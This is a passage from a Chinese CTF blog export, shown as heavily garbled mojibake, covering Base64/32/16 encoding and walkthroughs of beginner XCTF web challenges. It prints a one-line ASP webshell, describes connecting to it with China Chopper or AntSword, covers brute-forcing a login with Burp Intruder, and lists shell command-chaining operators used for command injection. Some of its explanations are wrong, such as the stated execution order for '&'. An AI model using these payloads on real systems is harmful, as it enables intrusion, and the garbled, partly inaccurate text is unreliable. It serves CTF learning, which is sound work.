å­—ç¬¦ä¸²è½¬ä¸º2è¿›åˆ¶ï¼Œæ¯3ä¸ª8ä½äºŒè¿›åˆ¶è½¬åŒ–ä¸º4ä¸ª6ä½äºŒè¿›åˆ¶ï¼Œå…­ä½äºŒè¿›åˆ¶è½¬åŒ–ä¸ºåè¿›åˆ¶ï¼Œæ ¹æ®åè¿›åˆ¶æ•°å€¼åœ¨base64ç¼–ç è¡¨ä¸­è·å–å­—ç¬¦ã€‚Base64ç¼–ç å°†ä¸²èµ·æ¥çš„äºŒè¿›åˆ¶ä»¥6ä½è¿›è¡Œåˆ†å‰².æ‰€ä»¥åˆ†åˆ‡ä¹‹å‰çš„äºŒè¿›åˆ¶ä½æ•°åº”è¯¥æ˜¯24çš„å€æ•°(å³6,8çš„æœ€å°å…¬å€æ•°).å¦‚æœä¸è¶³24ä½,åˆ™åœ¨ç¼–ç åæ•°æ®åé¢æ·»åŠ â€=â€(=ä¸ºå¡«å……å­—ç¬¦)ä¾‹å­1è½¬æ¢å‰ 11111111, 11111111, 11111111 ï¼ˆäºŒè¿›åˆ¶ï¼‰è½¬æ¢å 00111111, 00111111, 00111111, 00111111 ï¼ˆäºŒè¿›åˆ¶ï¼‰ä¸Šé¢çš„ä¸‰ä¸ªå­—èŠ‚æ˜¯åŸæ–‡ï¼Œä¸‹é¢çš„å››ä¸ªå­—èŠ‚æ˜¯è½¬æ¢åçš„Base64ç¼–ç ï¼Œå…¶å‰ä¸¤ä½å‡ä¸º0ã€‚è½¬æ¢åï¼Œæˆ‘ä»¬ç”¨ä¸€ä¸ªç è¡¨æ¥å¾—åˆ°æˆ‘ä»¬æƒ³è¦çš„å­—ç¬¦ä¸²ï¼ˆä¹Ÿå°±æ˜¯æœ€ç»ˆçš„Base64ç¼–ç ï¼‰ï¼Œè¿™ä¸ªè¡¨æ˜¯è¿™æ ·çš„ï¼šï¼ˆæ‘˜è‡ªRFC2045ï¼‰è½¬æ¢è¡¨ï¼š ä¾‹å­2è½¬æ¢å‰ 10101101,10111010,01110110è½¬æ¢å 00101011, 00011011 ,00101001 ,00110110åè¿›åˆ¶ 43 27 41 54å¯¹åº”ç è¡¨ä¸­çš„å€¼ r b p 2æ‰€ä»¥ä¸Šé¢çš„24ä½ç¼–ç ï¼Œç¼–ç åçš„Base64å€¼ä¸º rbp2è§£ç åŒç†ï¼ŒæŠŠ rbq2 çš„äºŒè¿›åˆ¶ä½è¿æ¥ä¸Šå†é‡ç»„å¾—åˆ°ä¸‰ä¸ª8ä½å€¼ï¼Œå¾—å‡ºåŸç ã€‚ base32ç¼–ç Base32ä½¿ç”¨äº†ASCIIç¼–ç ä¸­å¯æ‰“å°çš„32ä¸ªå­—ç¬¦(å¤§å†™å­—æ¯AZå’Œæ•°å­—27)å¯¹ä»»æ„å­—èŠ‚æ•°æ®è¿›è¡Œç¼–ç .Base32å°†ä¸²èµ·æ¥çš„äºŒè¿›åˆ¶æ•°æ®æŒ‰ç…§5ä¸ªäºŒè¿›åˆ¶ä½åˆ†ä¸ºä¸€ç»„,ç”±äºä¼ è¾“æ•°æ®çš„å•ä½æ˜¯å­—èŠ‚(å³8ä¸ªäºŒè¿›åˆ¶ä½).æ‰€ä»¥åˆ†å‰²ä¹‹å‰çš„äºŒè¿›åˆ¶ä½æ•°æ˜¯40çš„å€æ•°(40æ˜¯5å’Œ8çš„æœ€å°å…¬å€æ•°).å¦‚æœä¸è¶³40ä½,åˆ™åœ¨ç¼–ç åæ•°æ®è¡¥å……â€=â€,ä¸€ä¸ªâ€=â€ç›¸å½“äºä¸€ä¸ªç»„(5ä¸ªäºŒè¿›åˆ¶ä½),ç¼–ç åçš„æ•°æ®æ˜¯åŸå…ˆçš„8\\5å€. ç‰¹å¾ï¼šå¯†æ–‡ç”±32ä¸ªå­—ç¬¦ï¼ˆA-Z,2-7)ç»„æˆï¼Œæœ«å°¾å¯èƒ½ä¼šæœ‰â€˜=â€™ï¼Œä½†æœ€å¤šæœ‰6ä¸ª base16 base16æ˜¯ç”¨16ï¼ˆ2çš„4æ¬¡æ–¹ï¼‰ä¸ªç‰¹å®šASCIIç è¡¨ç¤º256ä¸ªASCIIå­—ç¬¦ã€‚1ä¸ªASCIIå­—ç¬¦ç»è¿‡base16ç¼–ç åä¼šå˜ä¸º2ä¸ªå­—ç¬¦ï¼Œé•¿åº¦å¢åŠ ä¸€å€ã€‚ å°†æ•°æ®è½¬æ¢ä¸ºäºŒè¿›åˆ¶æ•°ï¼Œä¸è¶³8æ¯”ç‰¹ä½é«˜ä½è¡¥0.ç„¶åå°†æ‰€æœ‰çš„äºŒè¿›åˆ¶å…¨éƒ¨ä¸²èµ·æ¥,4ä¸ªäºŒè¿›åˆ¶ä½ä¸ºä¸€ç»„,è½¬åŒ–æˆå¯¹åº”åè¿›åˆ¶æ•°,æ ¹æ®åè¿›åˆ¶æ•°å€¼æ‰¾åˆ°Base16ç¼–ç è¡¨é‡Œé¢å¯¹åº”çš„å­—ç¬¦.Base16æ˜¯4ä¸ªæ¯”ç‰¹ä½è¡¨ç¤ºä¸€ä¸ªå­—ç¬¦,æ‰€ä»¥åŸå§‹æ˜¯1ä¸ªå­—èŠ‚(8ä¸ªæ¯”ç‰¹ä½)åˆšå¥½å¯ä»¥åˆ†æˆä¸¤ç»„,ä¹Ÿå°±æ˜¯è¯´åŸå…ˆå¦‚æœä½¿ç”¨ASCIIç¼–ç åçš„ä¸€ä¸ªå­—ç¬¦,ç°åœ¨è½¬åŒ–æˆä¸¤ä¸ªå­—ç¬¦.æ•°æ®é‡æ˜¯åŸå…ˆçš„2å€,ä¸éœ€è¦è¡¥â€™=â€™ ç‰¹å¾ï¼šå¯†æ–‡ç”±16ä¸ªå­—ç¬¦ï¼ˆ0-9,A-Fï¼‰ç»„æˆ æ•°å€¼ 0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 å­—ç¬¦ 0 1 2 3 4 5 6 7 8 9 A B C D E F","categories":[{"name":"CTF","slug":"CTF","permalink":"https://singlemindedt.github.io/categories/CTF/"}],"tags":[{"name":"ç¼–ç ","slug":"ç¼–ç ","permalink":"https://singlemindedt.github.io/tags/ç¼–ç /"}]},{"title":"æ”»é˜²ä¸–ç•Œä¹‹Webæ–°æ‰‹ï¼ˆ7-12ï¼‰","slug":"æ”»é˜²ä¸–ç•Œä¹‹Webæ–°æ‰‹ï¼ˆ7-12ï¼‰","date":"2019-09-05T13:09:03.000Z","updated":"2019-12-30T04:37:17.261Z","comments":true,"path":"2019/09/05/æ”»é˜²ä¸–ç•Œä¹‹Webæ–°æ‰‹ï¼ˆ7-12ï¼‰/","link":"","permalink":"https://singlemindedt.github.io/2019/09/05/æ”»é˜²ä¸–ç•Œä¹‹Webæ–°æ‰‹ï¼ˆ7-12ï¼‰/","excerpt":"","text":"simple_jsé¢˜ç›®æè¿°ï¼šå°å®å‘ç°äº†ä¸€ä¸ªç½‘é¡µï¼Œä½†å´ä¸€ç›´è¾“ä¸å¯¹å¯†ç ã€‚(Flagæ ¼å¼ä¸º Cyberpeace{xxxxxxxxx} )æ‰“å¼€é“¾æ¥ç©ºç™½ï¼ŒæŸ¥çœ‹æºç ï¼Œæœ‰å¦‚ä¸‹ä»£ç ï¼š 12345678910111213141516171819202122232425262728293031function dechiffre(pass_enc) &#123; var pass = \"70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65\"; var tab = pass_enc.split(','); var tab2 = pass.split(','); var i, j, k, l = 0, m, n, o, p = \"\"; i = 0; j = tab.length; k = j + (l) + (n = 0); n = tab2.length; for (i = (o = 0); i &lt; (k = j = n); i++) &#123; o = tab[i - l]; p += String.fromCharCode((o = tab2[i])); if (i == 5) break; &#125; for (i = (o = 0); i &lt; (k = j = n); i++) &#123; o = tab[i - l]; if (i &gt; 5 &amp;&amp; i &lt; k - 1) p += String.fromCharCode((o = tab2[i])); &#125; p += String.fromCharCode(tab2[17]); pass = p; return pass;&#125;String[\"fromCharCode\"](dechiffre( \"\\x35\\x35\\x2c\\x35\\x36\\x2c\\x35\\x34\\x2c\\x37\\x39\\x2c\\x31\\x31\\x35\\x2c\\x36\\x39\\x2c\\x31\\x31\\x34\\x2c\\x31\\x31\\x36\\x2c\\x31\\x30\\x37\\x2c\\x34\\x39\\x2c\\x35\\x30\"));h = window.prompt('Enter password');alert(dechiffre(h)); è¿™ä¸€é•¿ä¸²16è¿›åˆ¶æ•°å¾ˆå¯ç–‘ï¼Œ 1\"\\x35\\x35\\x2c\\x35\\x36\\x2c\\x35\\x34\\x2c\\x37\\x39\\x2c\\x31\\x31\\x35\\x2c\\x36\\x39\\x2c\\x31\\x31\\x34\\x2c\\x31\\x31\\x36\\x2c\\x31\\x30\\x37\\x2c\\x34\\x39\\x2c\\x35\\x30\" è½¬å­—ç¬¦å¾—åˆ°ï¼š55,56,54,79,115,69,114,116,107,49,50å†å°†å…¶è½¬æ¢ä¸º10è¿›åˆ¶ASCIIç å¯¹åº”çš„å­—ç¬¦å¾—åˆ° ï¼š786OsErtk12åŠ ä¸Šé¢˜ç›®ç»™å‡ºçš„æ ¼å¼å¾—åˆ°flagï¼ˆè§£ç å‡½æ•°ä¼¼ä¹ä¸èƒ½å¾—åˆ°æ­£ç¡®å¯†ç //orzï¼Ÿï¼‰ xff_refereré¢˜ç›®æè¿°ï¼šXè€å¸ˆå‘Šè¯‰å°å®å…¶å®xffå’Œrefereræ˜¯å¯ä»¥ä¼ªé€ çš„ã€‚æ‰“å¼€é“¾æ¥å¦‚å›¾ï¼š X-Forwarded-Forå’ŒRefererXFFæ„é€ æ¥æºIPRefereræ„é€ æ¥æºæµè§ˆå™¨X-Forwarded-For:ç®€ç§°XFFå¤´ï¼Œå®ƒä»£è¡¨å®¢æˆ·ç«¯ï¼Œä¹Ÿå°±æ˜¯HTTPçš„è¯·æ±‚ç«¯çœŸå®çš„IPï¼Œåªæœ‰åœ¨é€šè¿‡äº†HTTP ä»£ç†æˆ–è€…è´Ÿè½½å‡è¡¡æœåŠ¡å™¨æ—¶æ‰ä¼šæ·»åŠ è¯¥é¡¹HTTP Refereræ˜¯headerçš„ä¸€éƒ¨åˆ†ï¼Œå½“æµè§ˆå™¨å‘webæœåŠ¡å™¨å‘é€è¯·æ±‚çš„æ—¶å€™ï¼Œä¸€èˆ¬ä¼šå¸¦ä¸ŠRefererï¼Œå‘Šè¯‰æœåŠ¡å™¨æˆ‘æ˜¯ä»å“ªä¸ªé¡µé¢é“¾æ¥è¿‡æ¥çš„ï¼ŒæœåŠ¡å™¨åŸºæ­¤å¯ä»¥è·å¾—ä¸€äº›ä¿¡æ¯ç”¨äºå¤„ç†åˆ©ç”¨bpæŠ“åŒ…ï¼š åœ¨HTTPå¤´æ·»åŠ ï¼šX-Forwarded-For:123.123.123.123 å¾—åˆ°ä¸‹å›¾æç¤ºï¼š å†åŠ ä¸€æ¡Referer:https://www.google.com å¾—åˆ°flagã€‚1:(/images/7.5.png)ç”±äºæ¯æ¬¡æ·»åŠ éƒ½è¦é‡æ–°è¾“å…¥ï¼Œè¿™é‡Œå¯ä»¥åˆ©ç”¨RepeateråŠŸèƒ½ï¼š å¾—åˆ°ï¼š å¯ä»¥åœ¨å·¦è¾¹ç›´æ¥ç¼–è¾‘Requestâ€”&gt;å³ä¾§å¾—åˆ°Responseï¼š Responseâ€”&gt;Flag! è‡ªå·±ç¼–è¾‘çš„æ—¶å€™æ³¨æ„Targetçš„æ ¼å¼ï¼š å»æ‰è¯·æ±‚åè®®http:// ç›¸å…³çŸ¥è¯†URLä¸URIï¼šhttps://blog.csdn.net/lslk9898/article/details/86490383 weak_authé¢˜ç›®æè¿°ï¼šå°å®å†™äº†ä¸€ä¸ªç™»é™†éªŒè¯é¡µé¢ï¼Œéšæ‰‹å°±è®¾äº†ä¸€ä¸ªå¯†ç ã€‚ æ ¹æ®å¼¹çª—çš„æç¤ºï¼Œç”¨æˆ·åå¿…é¡»æ˜¯adminå°†usenameè®¾ç½®ä¸ºadminï¼Œéšæ‰‹ï¼ï¼ï¼çœŸçš„æ˜¯éšæ‰‹ï¼Œè¾“äº†ä¸ª123456ï¼Œç»“æœå¯¹äº†hhh :) â€”â€”â€”â€”â€”â€”â€”â€”â€”-æ­£å¸¸è§£æ³•â€”â€”â€”â€”â€”â€”â€”-ç”¨Burp Suiteå¯¹å®ƒè¿›è¡Œå¯†ç çˆ†ç ´ï¼Œå¯ä»¥å…ˆè¯•ç€è¾“å…¥username=adminå’Œpassword=11111,ä»¥ç¡®å®šçˆ†ç ´ä½ç½®ã€‚Actionâ€”&gt;send to Intruder åŸºæœ¬é…ç½®ï¼š1ã€åœ¨æ¶ˆæ¯ç¼–è¾‘å™¨çš„ä¸Šæ–¹ï¼Œæœ‰ä¸€ä¸ªä¸‹æ‹‰é€‰æ‹©æ¡†ï¼Œæ”»å‡»ç±»å‹ï¼ˆAttack Typeï¼‰ï¼Œå‡ ç§ä¸åŒçš„æ–¹å¼ï¼Œè¿™é‡Œé€‰æ‹©ï¼šé›†æŸç‚¸å¼¹æ¨¡å¼ï¼ˆCluster bombï¼‰ å®ƒå¯ä»¥ä½¿ç”¨å¤šç»„Payloadé›†åˆï¼Œåœ¨æ¯ä¸€ä¸ªä¸åŒçš„Payloadæ ‡å¿—ä½ç½®ä¸Šï¼ˆæœ€å¤š20ä¸ªï¼‰ï¼Œä¾æ¬¡éå†æ‰€æœ‰çš„Payloadã€‚å®ƒä¸è‰å‰æ¨¡å¼çš„ä¸»è¦åŒºåˆ«åœ¨äºï¼Œæ‰§è¡Œçš„Payloadæ•°æ®Payloadç»„çš„ä¹˜ç§¯ã€‚ä¸¾ä¾‹æ¥è¯´ï¼Œå¦‚æœæœ‰ä¸¤ä¸ªPayloadæ ‡å¿—ä½ç½®ï¼Œç¬¬ä¸€ä¸ªPayloadå€¼ä¸ºAå’ŒBï¼Œç¬¬äºŒä¸ªPayloadå€¼ä¸ºCå’ŒDï¼Œåˆ™å‘èµ·æ”»å‡»æ—¶ï¼Œå°†å…±å‘èµ·å››æ¬¡æ”»å‡»ï¼Œç¬¬ä¸€æ¬¡ä½¿ç”¨çš„Payloadåˆ†åˆ«ä¸ºAå’ŒCï¼Œç¬¬äºŒæ¬¡ä½¿ç”¨çš„Payloadåˆ†åˆ«ä¸ºAå’ŒDï¼Œç¬¬ä¸‰æ¬¡ä½¿ç”¨çš„Payloadåˆ†åˆ«ä¸ºBå’ŒCï¼Œç¬¬å››æ¬¡ä½¿ç”¨çš„Payloadåˆ†åˆ«ä¸ºBå’ŒDã€‚ 2ã€ç”±äºusernameè§„å®šç”¨adminï¼›ç®€å•åˆ—è¡¨ï¼ˆSimple listï¼‰ â€”â€”æœ€ç®€å•çš„Payloadç±»å‹ï¼Œé€šè¿‡é…ç½®ä¸€ä¸ªå­—ç¬¦ä¸²åˆ—è¡¨ä½œä¸ºPayloadï¼Œä¹Ÿå¯ä»¥æ‰‹å·¥æ·»åŠ å­—ç¬¦ä¸²åˆ—è¡¨æˆ–ä»æ–‡ä»¶åŠ è½½å­—ç¬¦ä¸²åˆ—è¡¨ã€‚å…¶è®¾ç½®ç•Œé¢å¦‚ä¸‹å›¾ 3ã€å¯¼å…¥å¯†ç list 4ã€å¯é€‰é¡¹è®¾ç½®ï¼ˆOptionsï¼‰å¯é€‰é¡¹è®¾ç½®ä¸»è¦åŒ…æ‹¬è¯·æ±‚æ¶ˆæ¯å¤´è®¾ç½®ã€è¯·æ±‚å¼•æ“è®¾ç½®ã€æ”»å‡»ç»“æœè®¾ç½®ã€grep match, grep extract, grep payloads,ä»¥åŠé‡å®šå‘è®¾ç½®ã€‚åœ¨ä½¿ç”¨ä¸­ï¼Œä½ å¯ä»¥åœ¨æ”»å‡»å‰è¿›è¡Œè®¾ç½®ï¼Œä¹Ÿå¯ä»¥åœ¨æ”»å‡»è¿‡ç¨‹ä¸­åšè¿™äº›é€‰é¡¹çš„è°ƒæ•´ã€‚ å¼€å§‹çˆ†ç ´ï¼š å¯ä»¥æ˜æ˜¾çœ‹åˆ°å‡ºç°äº†é•¿åº¦ä¸ä¸€æ ·çš„å“åº”ï¼Œ123456åº”è¯¥å°±æ˜¯æ­£ç¡®å¯†ç ï¼ŒæŸ¥çœ‹Responseå¾—åˆ°Flagã€‚ webshellé¢˜ç›®æè¿°ï¼šå°å®ç™¾åº¦äº†phpä¸€å¥è¯,è§‰ç€å¾ˆæœ‰æ„æ€,å¹¶ä¸”æŠŠå®ƒæ”¾åœ¨index.phpé‡Œã€‚ çŸ¥è¯†è¡¥å……ï¼šwebshellå°±æ˜¯ä»¥aspã€phpã€jspæˆ–è€…cgiç­‰ç½‘é¡µæ–‡ä»¶å½¢å¼å­˜åœ¨çš„ä¸€ç§å‘½ä»¤æ‰§è¡Œç¯å¢ƒï¼Œä¹Ÿå¯ä»¥å°†å…¶ç§°åšä¸ºä¸€ç§ç½‘é¡µåé—¨ã€‚é»‘å®¢åœ¨å…¥ä¾µäº†ä¸€ä¸ªç½‘ç«™åï¼Œé€šå¸¸ä¼šå°†aspæˆ–phpåé—¨æ–‡ä»¶ä¸ç½‘ç«™æœåŠ¡å™¨WEBç›®å½•ä¸‹æ­£å¸¸çš„ç½‘é¡µæ–‡ä»¶æ··åœ¨ä¸€èµ·ï¼Œç„¶åå°±å¯ä»¥ä½¿ç”¨æµè§ˆå™¨æ¥è®¿é—®aspæˆ–è€…phpåé—¨ï¼Œå¾—åˆ°ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œç¯å¢ƒï¼Œä»¥è¾¾åˆ°æ§åˆ¶ç½‘ç«™æœåŠ¡å™¨çš„ç›®çš„ã€‚é¡¾åæ€ä¹‰ï¼Œâ€œwebâ€çš„å«ä¹‰æ˜¯æ˜¾ç„¶éœ€è¦æœåŠ¡å™¨å¼€æ”¾webæœåŠ¡ï¼Œâ€œshellâ€çš„å«ä¹‰æ˜¯å–å¾—å¯¹æœåŠ¡å™¨æŸç§ç¨‹åº¦ä¸Šæ“ä½œæƒé™ã€‚webshellå¸¸å¸¸è¢«ç§°ä¸ºå…¥ä¾µè€…é€šè¿‡ç½‘ç«™ç«¯å£å¯¹ç½‘ç«™æœåŠ¡å™¨çš„æŸç§ç¨‹åº¦ä¸Šæ“ä½œçš„æƒé™ã€‚ç”±äºwebshellå…¶å¤§å¤šæ˜¯ä»¥åŠ¨æ€è„šæœ¬çš„å½¢å¼å‡ºç°ï¼Œä¹Ÿæœ‰äººç§°ä¹‹ä¸ºç½‘ç«™çš„åé—¨å·¥å…·ã€‚ä¸Šä¼ æœ¨é©¬æ‹¿webshellçš„æ–¹æ³•æ±‡æ€»å›¾ç‰‡ç»™å‡ºçš„ä»£ç ä¸ºphpä¸€å¥è¯æœ¨é©¬ï¼šä¸€å¥è¯æœ¨é©¬çš„å·¥ä½œåŸç†ï¼šä¸€å¥è¯æœ¨é©¬åˆ†ææœåŠ¡ç«¯ä¸å®¢æˆ·ç«¯ã€‚ â€œä¸€å¥è¯æœ¨é©¬â€æœåŠ¡ç«¯ï¼ˆæ˜¯ç”¨äºæœ¬åœ°çš„htmlæäº¤è„šæœ¬æœ¨é©¬æ–‡ä»¶ï¼‰å°±æ˜¯æˆ‘ä»¬è¦ç”¨æ¥æ’å…¥åˆ°aspæ–‡ä»¶ä¸­çš„aspè¯­å¥ï¼Œï¼ˆä¸ä»…ä»…æ˜¯ä»¥aspä¸ºåç¼€çš„æ•°æ®åº“æ–‡ä»¶ï¼‰ï¼Œè¯¥è¯­å¥å°†å›ä¸ºè§¦å‘ï¼Œæ¥æ”¶å…¥ä¾µè€…é€šè¿‡å®¢æˆ·ç«¯æäº¤çš„æ•°æ®ï¼Œæ‰§è¡Œå¹¶å®Œæˆç›¸åº”çš„æ“ä½œï¼ŒæœåŠ¡ç«¯çš„ä»£ç å†…å®¹ä¸º &lt;%execute request(â€œvalueâ€)%&gt; å…¶ä¸­valueå¯ä»¥è‡ªå·±ä¿®æ”¹â€œä¸€å¥è¯æœ¨é©¬â€å®¢æˆ·ç«¯ï¼ˆè¿œç¨‹æœåŠ¡å™¨ä¸Šè¢«æ’å…¥ä¸€å¥è¯çš„aspå¯æ‰§è¡Œæ–‡ä»¶ï¼‰ç”¨æ¥å‘æœåŠ¡ç«¯æäº¤æ§åˆ¶æ•°æ®çš„ï¼Œæäº¤çš„æ•°æ®é€šè¿‡æœåŠ¡ç«¯æ„æˆå®Œæ•´çš„aspåŠŸèƒ½è¯­å¥å¹¶æ‰§è¡Œï¼Œä¹Ÿå°±æ˜¯ç”Ÿæˆæˆ‘ä»¬æ‰€éœ€è¦çš„aspæœ¨é©¬æ–‡ä»¶ ç”¨ä¸­å›½èœåˆ€æˆ–è€…èšå‰‘ç­‰å·¥å…·å¯ä»¥ä¸Šä¼ æˆ–æ‰§è¡Œå‘½ä»¤ï¼Œå¯†ç æ˜¯shellã€‚ è¿æ¥æˆåŠŸï¼š é€‰æ‹©åŒå‡»ï¼š çœ‹åˆ°flag.txt,æ‰“å¼€ï¼š command_executioné¢˜ç›®æè¿°ï¼šå°å®å†™äº†ä¸ªpingåŠŸèƒ½,ä½†æ²¡æœ‰å†™waf,Xè€å¸ˆå‘Šè¯‰å¥¹è¿™æ˜¯éå¸¸å±é™©çš„ï¼Œä½ çŸ¥é“ä¸ºä»€ä¹ˆå—ã€‚ çŸ¥è¯†è¡¥å……ï¼š1ã€ping ï¼ˆç½‘ç»œè¯Šæ–­å·¥å…·ï¼‰Pingæ˜¯Windowsã€Unixå’ŒLinuxç³»ç»Ÿä¸‹çš„ä¸€ä¸ªå‘½ä»¤ã€‚pingä¹Ÿå±äºä¸€ä¸ªé€šä¿¡åè®®ï¼Œæ˜¯TCP/IPåè®®çš„ä¸€éƒ¨åˆ†ã€‚åˆ©ç”¨â€œpingâ€å‘½ä»¤å¯ä»¥æ£€æŸ¥ç½‘ç»œæ˜¯å¦è¿é€šï¼Œå¯ä»¥å¾ˆå¥½åœ°å¸®åŠ©æˆ‘ä»¬åˆ†æå’Œåˆ¤å®šç½‘ç»œæ•…éšœã€‚åº”ç”¨æ ¼å¼ï¼špingç©ºæ ¼IPåœ°å€ã€‚è¯¥å‘½ä»¤è¿˜å¯ä»¥åŠ è®¸å¤šå‚æ•°ä½¿ç”¨ï¼Œå…·ä½“æ˜¯é”®å…¥pingæŒ‰å›è½¦å³å¯çœ‹åˆ°è¯¦ç»†è¯´æ˜ã€‚ä½œä¸ºä¸€ä¸ªç”Ÿæ´»åœ¨ç½‘ç»œä¸Šçš„ç®¡ç†å‘˜æˆ–è€…é»‘å®¢æ¥è¯´ï¼Œpingå‘½ä»¤æ˜¯ç¬¬ä¸€ä¸ªå¿…é¡»æŒæ¡çš„DOSå‘½ä»¤ï¼Œå®ƒæ‰€åˆ©ç”¨çš„åŸç†æ˜¯è¿™æ ·çš„ï¼šåˆ©ç”¨ç½‘ç»œä¸Šæœºå™¨IPåœ°å€çš„å”¯ä¸€æ€§ï¼Œç»™ç›®æ ‡IPåœ°å€å‘é€ä¸€ä¸ªæ•°æ®åŒ…ï¼Œå†è¦æ±‚å¯¹æ–¹è¿”å›ä¸€ä¸ªåŒæ ·å¤§å°çš„æ•°æ®åŒ…æ¥ç¡®å®šä¸¤å°ç½‘ç»œæœºå™¨æ˜¯å¦è¿æ¥ç›¸é€šï¼Œæ—¶å»¶æ˜¯å¤šå°‘ã€‚pingæŒ‡çš„æ˜¯ç«¯å¯¹ç«¯è¿é€šï¼Œé€šå¸¸ç”¨æ¥ä½œä¸ºå¯ç”¨æ€§çš„æ£€æŸ¥ï¼Œ ä½†æ˜¯æŸäº›ç—…æ¯’æœ¨é©¬ä¼šå¼ºè¡Œå¤§é‡è¿œç¨‹æ‰§è¡Œpingå‘½ä»¤æŠ¢å ä½ çš„ç½‘ç»œèµ„æºï¼Œå¯¼è‡´ç³»ç»Ÿå˜æ…¢ï¼Œç½‘é€Ÿå˜æ…¢ã€‚ä¸¥ç¦pingå…¥ä¾µä½œä¸ºå¤§å¤šæ•°é˜²ç«å¢™çš„ä¸€ä¸ªåŸºæœ¬åŠŸèƒ½æä¾›ç»™ç”¨æˆ·è¿›è¡Œé€‰æ‹©ã€‚ 2ã€æœ‰å…³å‘½ä»¤æ‰§è¡Œçš„çŸ¥è¯†windowsæˆ–linuxä¸‹ï¼š 1234command1 &amp; command2 ï¼šå…ˆæ‰§è¡Œcommand2åæ‰§è¡Œcommand1command1 &amp;&amp; command2 ï¼šå…ˆæ‰§è¡Œcommand1åæ‰§è¡Œcommand2command1 | command2 ï¼šåªæ‰§è¡Œcommand2command1 || command2 ï¼šcommand1æ‰§è¡Œå¤±è´¥ï¼Œå†æ‰§è¡Œcommand2(è‹¥command1æ‰§è¡ŒæˆåŠŸï¼Œå°±ä¸å†æ‰§è¡Œcommand2) 3ã€WAFWebåº”ç”¨é˜²æŠ¤ç³»ç»Ÿï¼ˆä¹Ÿç§°ä¸ºï¼šç½‘ç«™åº”ç”¨çº§å…¥ä¾µé˜²å¾¡ç³»ç»Ÿã€‚è‹±æ–‡ï¼šWeb Application Firewallï¼Œç®€ç§°ï¼š WAFï¼‰ã€‚åˆ©ç”¨å›½é™…ä¸Šå…¬è®¤çš„ä¸€ç§è¯´æ³•ï¼šWebåº”ç”¨é˜²ç«å¢™æ˜¯é€šè¿‡æ‰§è¡Œä¸€ç³»åˆ—é’ˆå¯¹HTTP/HTTPSçš„å®‰å…¨ç­–ç•¥æ¥ä¸“é—¨ä¸ºWebåº”ç”¨æä¾›ä¿æŠ¤çš„ä¸€æ¬¾äº§å“ã€‚Webåº”ç”¨é˜²ç«å¢™ä¼šå¯¹HTTPçš„è¯·æ±‚è¿›è¡Œå¼‚å¸¸æ£€æµ‹ï¼Œæ‹’ç»ä¸ç¬¦åˆHTTPæ ‡å‡†çš„è¯·æ±‚ã€‚å¹¶ä¸”ï¼Œå®ƒä¹Ÿå¯ä»¥åªå…è®¸HTTPåè®®çš„éƒ¨åˆ†é€‰é¡¹é€šè¿‡ï¼Œä»è€Œå‡å°‘æ”»å‡»çš„å½±å“èŒƒå›´ã€‚ç”šè‡³ï¼Œä¸€äº›Webåº”ç”¨é˜²ç«å¢™è¿˜å¯ä»¥ä¸¥æ ¼é™å®šHTTPåè®®ä¸­é‚£äº›è¿‡äºæ¾æ•£æˆ–æœªè¢«å®Œå…¨åˆ¶å®šçš„é€‰é¡¹ã€‚ï¼ˆWAFç»•è¿‡ï¼‰æ­¤é¢˜ç»™å‡ºæœªå¼€WAFï¼Œæ‰€ä»¥ä¸ç”¨è€ƒè™‘è¿™ä¸€æ­¥ã€‚ 4ã€è¿˜éœ€è¦æŒæ¡ä¸€äº›å¸¸ç”¨çš„å‘½ä»¤ls å¯¹äºç›®å½•ï¼Œè¯¥å‘½ä»¤åˆ—å‡ºè¯¥ç›®å½•ä¸‹çš„æ‰€æœ‰å­ç›®å½•ä¸æ–‡ä»¶ã€‚å¯¹äºæ–‡ä»¶ï¼Œå°†åˆ—å‡ºæ–‡ä»¶åä»¥åŠå…¶ä»–ä¿¡æ¯ã€‚Cd æ”¹å˜å·¥ä½œç›®å½•ï¼Œå°†å½“å‰å·¥ä½œç›®å½•æ”¹å˜åˆ°æŒ‡å®šçš„ç›®å½•ä¸‹ã€‚catæ˜¯æ‰“å°æ–‡ä»¶å†…å®¹tac æ˜¯åå‘æ‰“å°less æ–‡ä»¶åï¼šåˆ†é¡µæ˜¾ç¤ºæ–‡ä»¶å†…å®¹ï¼ˆå¦‚less /etc/passwdï¼‰Find æ²¿ç€æ–‡ä»¶å±‚æ¬¡ç»“æ„å‘ä¸‹éå†ï¼ŒåŒ¹é…ç¬¦åˆæ¡ä»¶çš„æ–‡ä»¶ï¼Œå¹¶æ‰§è¡Œç›¸åº”æ“ä½œã€‚å…³äºfindå¯ä»¥å‚è€ƒï¼šhttps://www.jianshu.com/p/16af649d9b6d*&lt;åˆ©ç”¨æˆªæ–­æ¥æ‰§è¡Œè¡Œçš„å‘½ä»¤ï¼Œå¦‚â€™$â€™ å’Œ â€˜ ; â€˜å’Œ â€˜|â€™ å’Œ â€˜-â€˜ å’Œ â€˜(â€˜ å’Œ â€˜ ) â€˜ å’Œ â€˜ â€œ â€˜ å’Œ â€˜||â€™ å’Œâ€™&amp;&amp;â€™ å’Œ â€˜&amp;â€™ å’Œ â€˜{â€˜ å’Œ â€˜}â€™ç­‰&gt;*å®é™…æ“ä½œï¼š è¯•ç€ä½¿ç”¨å‘½ä»¤è¿æ¥ç¬¦ï¼ŒæŸ¥çœ‹ç›®å½• å‘ç°æœ‰homeç›®å½•ï¼Œçœ‹çœ‹é‡Œé¢æœ‰å•¥ï¼š å‘ç°æœ‰flag.txt;æˆ–è€…ç›´æ¥æ ¹æ®æ–‡ä»¶åæˆ–æ­£åˆ™è¡¨è¾¾å¼è¿›è¡Œæœç´¢ï¼Œå¦‚ä¸‹ï¼š å¾—åˆ°flag.txtåœ¨homeä¸‹ï¼Œcatä¸€ä¸‹ï¼š åŒæ—¶è¿™é“é¢˜ï¼ŒæŸ¥çœ‹ä»£ç å¯ä»¥å‘ç°ï¼šPOSTä¼ å‚æ˜¯é€šè¿‡å‚æ•°targetï¼Œè€Œtargetå°±æ˜¯æˆ‘ä»¬æ‰€è¦è¾“å…¥çš„å€¼ å°è¯•postä¼ å€¼ï¼š å¾—åˆ°flag: simple_php##é¢˜ç›®æè¿°ï¼šå°å®å¬è¯´phpæ˜¯æœ€å¥½çš„è¯­è¨€,äºæ˜¯å¥¹ç®€å•å­¦ä¹ ä¹‹åå†™äº†å‡ è¡Œphpä»£ç ã€‚æ‰“å¼€é“¾æ¥ï¼š å¾ˆç®€å•çš„PHPä»£ç 